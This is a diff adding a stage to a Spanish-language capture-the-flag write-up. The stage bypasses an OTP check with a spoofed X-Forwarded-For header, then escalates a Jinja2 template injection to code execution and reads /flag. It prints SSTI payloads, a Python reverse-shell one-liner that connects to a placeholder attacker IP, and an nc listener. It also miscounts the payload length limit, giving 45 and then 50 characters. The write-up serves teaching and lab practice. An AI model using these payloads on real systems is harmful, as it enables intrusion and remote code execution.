@@ -144,7 +144,7 @@ Si recargamos la página, comprobamos que nos hemos autenticado correctamente co
 <details>
 <summary>Mostrar</summary>
 
-En esta etapa, vamos a ver cómo podemos acceder como administrador.
+En esta etapa, el objetivo es acceder como administrador.
 
 Tras iniciar sesión, podemos ver que tenemos una funcionalidad para publicar posts, pero se encuentra deshabilitada.
 
@@ -189,8 +189,131 @@ Si recargamos la página, comprobamos que hemos accedido como administrador.
 <details>
 <summary>Mostrar</summary>
 
-En esta etapa, vamos a ver cómo podemos leer el archivo /flag.
+En esta etapa, el objetivo es leer el archivo /flag, que contiene la flag final.
 
+El panel de administración tiene la siguiente apariencia:
 
+![](img/adminpanel.png)
+
+Tenemos dos opciones: actualizar los datos del servidor SMTP y enviar un correo electrónico de prueba. El problema es que si intentamos usar cualquiera de las dos opciones, salta un segundo factor de autenticación, que nos pide un código OTP.
+
+Ejemplo al intentar actualizar los datos del servidor SMTP:
+
+![](img/verifyotp.png)
+
+Existen casos en los que las aplicaciones confían en la cabecera "X-Forwarded-For". Esta cabecera fue creada para que los servidores web puedan saber la IP real de los usuarios que acceden a la aplicación a través de un proxy. En este caso, la aplicación confía en esta cabecera y no comprueba la IP real del usuario.
+
+Si agregamos la cabecera "X-Forwarded-For" para que su valor sea la dirección IPv4 de loopback (127.0.0.1), la aplicación cree que el usuario está accediendo desde la misma máquina que el servidor, por lo que no se activa el segundo factor de autenticación.
+
+La petición que se realiza al intentar actualizar los datos del servidor SMTP es la siguiente:
+
+![](img/updatesmtporiginalrequest.png)
+
+Al agregar la cabecera "X-Forwarded-For: 127.0.0.1", el servidor no comprueba el segundo factor de autenticación y autoriza la petición.
+
+![](img/updatesmtpmodifiedrequest.png)
+
+Podemos agregar una regla de "Match and Replace" en Burp Suite para que se agregue la cabecera "X-Forwarded-For" automáticamente en todas las peticiones, con la siguiente configuración:
+
+* **Type:** Request header
+* **Replace:** X-Forwarded-For: 127.0.0.1
+
+![](img/addmatchreplacerule.png)
+
+Vamos a modificar la dirección IP del servidor SMTP para que sea la del atacante.
+
+![](img/smtpipmodified.png)
+
+Con Python podemos crear un servidor SMTP que escuche en el puerto 25 y nos muestre los correos electrónicos que reciba. Para ello, ejecutamos el siguiente comando:
+
+    sudo python3 -m smtpd -n -c DebuggingServer 0.0.0.0:25
+
+![](img/pythonsmtpserver.png)
+
+Ahora, si enviamos un correo electrónico de prueba a cualquier dirección, lo recibimos en el servidor SMTP.
+
+![](img/receiveemail.png)
+
+La petición que se realiza al enviar un correo electrónico de prueba es la siguiente:
+
+![](img/sendemailrequest.png)
+
+La clave "message" llama la atención porque su valor contiene la variable {{session['username']}}, que es sustituido por el nombre del usuario que envía el correo electrónico. Esto recuerda a una vulnerabilidad de Server-Side Template Injection (SSTI), que permite ejecutar código en el servidor, en este caso, código Python.
+
+Para confirmar que se trata de una vulnerabilidad de SSTI, lo primero es identificar el motor de plantillas que utiliza la aplicación, dado que cada uno tiene su propia sintaxis. 
+
+El motor de plantillas más utilizado en Flask es Jinja2. Para comprobar si la aplicación está utilizando este motor de plantillas, podemos probar a enviar un correo electrónico de prueba con el siguiente contenido:
+
+    {{config}}
+
+![](img/config.png)
+
+Y comprobar si la respuesta contiene información sobre la configuración de la aplicación. 
+
+![](img/configreceived.png)
+
+Funciona, por lo que podemos probar a extraer el contenido del archivo /flag, mediante el siguiente payload extraído de [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-ospopenread):
+
+    {{cycler.__init__.__globals__.os.popen('cat /flag').read()}}
+
+![](img/messagetoolong1.png)
+
+Desgraciadamente, el valor de la clave "message" es demasiado largo, por lo que el payload no es ejecutado.
+
+Necesitamos un payload más corto, pero primero necesitamos conocer cuánto espacio tenemos disponible para el payload. Vamos a ir agregando caracteres "X" en "message" hasta que la petición devuelva un error.
+
+Al enviar 45 caracteres "X", la petición funciona correctamente.
+
+![](img/45x.png)
+
+Al enviar 46 caracteres "X", la petición devuelve un error.
+
+![](img/46x.png)
+
+Podemos concluir que tenemos 50 caracteres disponibles para el payload.
+
+El artículo [Exploiting Jinja SSTI with limited payload size](https://niebardzo.github.io/2020-11-23-exploiting-jinja-ssti/) ofrece una solución para saltar la restricción de tamaño de payload.
+
+La técnica propuesta consiste es actualizar "config", que es un diccionario que contiene la configuración de la aplicación. Añadimos un elemento al diccionario llamado "a" con el comando que le pasemos por el parámetro GET "a" (valga la redundancia). 
+
+De esta forma, no necesitamos incluir el comando en el campo "message", sino que lo pasamos por el parámetro GET, evadiendo así la restricción de tamaño.
+
+En este caso, el comando es una reverse shell de Python 3.
+
+    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP_ATACANTE>",<PUERTO_ATACANTE>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+
+**Importante:** Modificar "IP_ATACANTE" y "PUERTO_ATACANTE" por la dirección IP y el puerto del atacante respectivamente. Seleccionamos el texto y presionamos "Ctrl+U" para que se codifique en formato URL.
+
+Y el payload que vamos a utilizar es el siguiente:
+
+    {{config.update(a=request.args.get('a'))}}
+
+![](img/payload.png)
+
+Nos ponemos a la escucha en el puerto especificado en el payload.
+
+    nc -lvnp <PUERTO_ATACANTE>
+
+![](img/nc.png)
+
+Lanzamos os.popen(config.a) para que se ejecute el comando de la reverse shell, con el siguiente payload:
+
+    {{lipsum.__globals__.os.popen(config.a)}}
+
+Explicación del payload:
+* **lipsum:** función que genera texto aleatorio, desde aquí podemos acceder a las variables globales.
+* **\_\_globals\_\_:** diccionario que contiene las variables globales, incluyendo "os".
+* **os:** módulo que contiene funciones para interactuar con el sistema operativo.
+* **popen:** función que ejecuta un comando en el sistema operativo.
+
+![](img/revshell.png)
+
+Y obtenemos una reverse shell.
+
+![](img/shell.png)
+
+Leemos el contenido del archivo /flag.
+
+![](img/flag.png)
 
 </details>
